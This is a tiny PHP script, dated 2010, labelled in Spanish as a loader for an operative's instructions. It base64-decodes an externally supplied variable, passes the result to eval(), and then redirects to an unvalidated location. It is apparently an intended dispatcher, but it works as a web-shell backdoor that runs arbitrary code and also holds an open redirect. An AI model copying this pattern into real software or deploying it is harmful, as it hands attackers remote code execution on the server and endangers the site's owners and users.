<?php

/**
 *   Cargador de instrucciones del operativo
 *
 * @version $Id$
 * @copyright 2010
 */

$Instruccion=base64_decode($i);
eval($Instruccion);
header("location:$Programa");
?>